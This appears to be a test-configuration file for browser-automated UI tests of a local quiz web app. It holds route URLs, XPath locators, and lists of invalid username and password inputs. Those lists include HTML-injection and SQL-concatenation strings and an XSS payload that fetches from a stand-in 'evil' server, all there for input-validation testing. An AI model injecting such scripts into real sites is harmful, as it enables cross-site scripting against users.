BROWSER = "chrome"
# increase a little for non-headless runs to see what's going on
DELAY = "0 seconds"
BASE_URL = "http://localhost:5000"

ROUTES_DICT = {
    'Landing': f"{BASE_URL}",
    'Register': f"{BASE_URL}/register",
    'Login': f"{BASE_URL}/login",
    'Quiz': f"{BASE_URL}/quiz",
    'Attempt': f"{BASE_URL}/attempt",
}

DEFAULT_ANSWER_OPTIONS = 2
MAX_ANSWER_OPTIONS = 5

ANSWER_INPUTS = "//*[@id='answeropts']//input[contains(@id,'answeropt')]"
ANSWER_CHECKBOXES = "//*[@id='answeropts']//input[contains(@id,'iscorrect')]"
VISIBLE_QUIZZES = "//*[@id='quizlist']/div//h2"
ANSWER_OPTIONS = "//*[@id='content']//form/div/label/span"

NEXT_QUESTION_BTN = "//*[@id='content']//form/button[text()='Next']"
LOGOUT_BTN = "//*[@id='appheader']/div//form/button[text()='Logout']"
SUBMIT_BTN = "//*[@id='content']/form//button[@type='submit']"
ADD_ANSWER_BTN = "id:add_answeropt"
REMOVE_ANSWER_BTN = "id:remove_answeropt"
SAVE_QUESTION_BTN = "id:save_question"
QUIZ_DONE_BTN = "id:finish_creation"
ADD_QUIZ_BTN = "Create"
START_QUIZ_BUTTON = "Start quiz"

EMPTY = ""

NAIVE_INVALID_INPUTS_TO_USERNAME = [
    EMPTY,
    ' ',
    'y',
    'yo',
    'yoy',
    'yoyo',
    'yoyoy',
    ' yoyoy',
    'asdfasdfa___&',
    '             ',
    '<strong>Murmeli</strong>',
    'CHR(104)||CHR(101)||CHR(108)||CHR(108)',
    '<script>fetch("http://myevilserver.com").then(r => r.json()).then(() => console.log("do something evil"))</script>'
]

NAIVE_INVALID_INPUTS_TO_PASSWORD = [
    EMPTY,
    ' ',
    'y',
    'yo',
    'yoy',
    'yoyo',
    'yoyoy',
    ' yoyoy',
    '             ',
    '<strong>Murmeli</strong>',
    'CHR(104)||CHR(101)||CHR(108)||CHR(108)',
    '<script>fetch("http://myevilserver.com").then(r => r.json()).then(() => console.log("do something evil"))</script>'
]
